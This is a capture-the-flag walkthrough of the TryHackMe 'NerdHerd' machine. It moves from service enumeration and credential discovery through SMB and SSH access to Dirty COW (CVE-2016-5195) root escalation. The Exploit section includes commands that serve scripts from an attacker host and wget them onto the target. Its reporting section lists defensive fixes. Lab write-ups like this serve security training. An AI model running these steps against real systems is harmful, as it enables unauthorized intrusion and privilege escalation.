TryHackMe <br>
NerdHerd
---
 
![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/80584ddc-a6d6-4290-9434-2da143ac5a6f)

# Reconnaissance/Scanning
I started off by scanning the network to see which ports were open/services running on the ports. <br>
```
$ nmap -A -O -sC -sV -p- <machine_IP>
```
![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/42f38603-96c6-40c3-a1c8-7d157024ce3a)
 
Gobuster scan on port 1337:

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/b3064e7f-6dc7-4fb4-8a9a-b1fb018716f3)
 
Scanning /admin:

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/7fdf5848-0184-421e-9acf-5579d27b3e61)
 
Trying to enumerate the SMB server for anything. <br>
Using smbmap I found the shares but no users. Since I have no access as guest, I need a username.
```
$ smbmap -H <machine_IP>
```
![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/acb829b3-8031-4b33-a51e-a3d13a32649d)
 
Looking for users using the tool enum4linux, I found one!
```
$ enum4linux -a <machine_IP>
```
![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/c5311c37-a1d1-417b-a1c5-66126bb8080c)
 
Nice! I tried logging in to the SMB server to view the share nerdherd_classified as the user chuck  <br>
but was prompted for a password, which I don’t happen to have.. <br>
I’ll start working on the FTP server since it supports anonymous login.

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/c3cb69e2-e238-433b-9c8c-91ae37f63d61)
 
In the /pub directory there’s a hidden directory and a png file.

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/0016e2c6-e7a1-4607-b644-5603351d09aa)
 
In the /.jokesonyou directory there was a text file.

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/cadb7095-5e27-4efb-8b33-c0fcd86414bf)
 
Contents of that text file:

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/9b09c7e9-8a75-49f0-99b1-0ea2971197d9)
 
Well, using “leet speak”, they must mean 1337 from leet, so what I’m looking for must be on the web server. <br>
Lol, I got an alert as soon as I got to the Apache splash page.

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/3c03d993-2d6f-492f-a888-2581a3bf8071)
 
Followed by:

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/55bea2e9-20fb-4bb7-8cca-9180b2ed9494)
 
Well, let me check the source code before I head to the /admin directory.

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/d76ef483-da59-434d-8399-e07abb28cb9f)
 
Towards the bottom was a link to “The Bird is the Word” music video on youtube.

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/314304e6-5bc2-4b56-9f3f-42433f21ffc0)
 
Moving on to the /admin page, I was brought to a login prompt.  <br>
Before I tried some SQL injection, I checked the source code to find something noteworthy.

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/8bafaaa6-7471-4ef0-bd10-5277d0759a08)
 
Looks like some base64 encoded strings. <br>
I got another username from the first string! 

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/614594f3-5c2f-4ffd-961c-77cf3d733a98)
 
When trying to decode the second string I got a message saying it was invalid, so I tried to remedy it myself without luck.  <br>
I was able to find a base64 repair tool but that didn’t work either! <br> <br>

Since I couldn’t get that second string decoded, I moved on to the image file. <br>
I tried to run some steganography tools on it but the alert I kept getting was “file not supported”. <br>
I ran the command exiftool to look at the metadata on it for anything and when I saw the owner name it stood out.  <br>
It didn’t look normal to me, so I googled it in case it was a clue.

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/04d8d49f-490d-4a9a-962b-b95adca143a7)
 
The first result that popped up was Vigenère cipher. I went to dcode[.]fr and tried to decode it, but no luck. <br>
There was a field for a key on the decode page, which made me think back to the findings from earlier.  <br>
Bird is the word. I’ll try the word “bird”. <br>

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/854a3dbb-3f9e-4615-8e37-beda827c9598)
 
That only looks halfway decoded but looks like there is a key! That made me think of trying the whole name of the song.

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/48b94884-b17e-439c-88c6-18ddc790e6f8)
 
Looks like it turned out to be a password! Since I have a password now, let me go back to the SMB server and try that again.
```
$ smbclient \\\\10.10.220.169\\nerdherd_classified -U chuck
```
With the password found I can now log in!

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/7e394222-254f-43b0-8fbd-c39884162011)
 
After downloading that, this is what the contents were:

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/378a976f-2c9e-45a8-888d-7bfff589c4dd)
 
Visiting that directory showed another text file.

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/f10cfa52-f55b-4db9-8609-52a723ca0fa2)
 
The contents of the text file really were credentials, well, potentially. Let me try them on the SSH server.

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/35ae3550-3944-4cee-8489-5718cdc73709)
 
I’m in!

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/1ace7bfc-c75a-4ec0-bbcb-419b9d09085f)
 
This user is in plenty of groups, maybe one of them has access to files or executables I can exploit.. <br>
First things first, check the easy things since I have this user’s password. <br>
I’ll grab the user flag while I’m at it.

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/d24f7154-1f97-4b3f-a525-0a4ff434da24)

# Exploit
Can’t run anything as root, nothing juicy in the .bash_history file, no cronjobs, and no binaries with SUID bits. <br>
I changed directories to /tmp, uploaded linpeas and fired that off. <br>
```
# I started a python server on my machine
$ python3 -m http.server <PORT>

# then I used wget to grab the script to the target machine
$ wget hxxp://<IP>:<PORT>/path/to/file

# after successfully getting the script change permissions to execute
$ chmod 777 linpeas.sh
# execute the script
$ ./linpeas.sh
```
One of the things the script found was:

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/0394f8f1-b6ff-45fe-88df-c53e649cad1d)
 
![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/a4c29430-d9fb-4828-959a-91c3cf953581)


It’s showing that the machine is potentially vulnerable to CVE-2016–5195 which is the “dirty cow” kernel exploit. Info found <a href="https://dirtycow.ninja/">here.</a>
```
"A race condition was found in the way the Linux kernel's memory subsystem
handled the copy-on-write (COW) breakage of private read-only memory mappings.

An unprivileged local user could use this flaw to gain write access to
otherwise read-only memory mappings and thus increase their privileges on the system."
```
Here’s a snippet via exploit-db[.]com from the code on how to be able to run it.

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/f402b032-826f-4160-88f4-bfd5fa766f50)
 

I had to download the script to my machine, use Python to make another simple server, then grab it on the target machine and follow the directions to execute it.

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/d6816de3-3f4e-481f-a41e-ca86147f32ef)

# Privilege Escalation
The new user with root privileges is made via the script and now I can escalate to that user.

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/81a28076-ec14-4886-9b90-9d30490b1cfd)

 
Now with root privileges, I was going to get the root flag, or so I thought.

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/20ce32f7-23ae-49b9-839c-347375ed6af3)
 
I used the find command with some tweaking to see all the text files
```
# find / -type f -iname '*.txt' 2>/dev/null | grep "root"
```

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/a2b30185-687d-426e-b483-142627cff686)
 

Now I’ll grab the root flag!

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/db5f0a93-814b-44e9-8ef8-a5c2bcbfa456)
 
I stumbled onto the bonus flag by being nosy and looking at root’s .bash_history file since its output didn’t get deleted. LOL

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/b932ef3b-3e7b-4557-9596-0f563ef35324)
 
# Reporting
* It's highly advised to disable anonymous login on the FTP server. <br>
* Enable account lockout on the SSH server to prevent bruteforce attacks. <br>
* Be sure to use strong passwords on files or even a password manager to help generate and store the password. <br>
* Keep all software and hardware patched and up to date with the latest security releases to prevent vulnerabilities. <br>
* Have the file output of user's .bash_history get deleted.
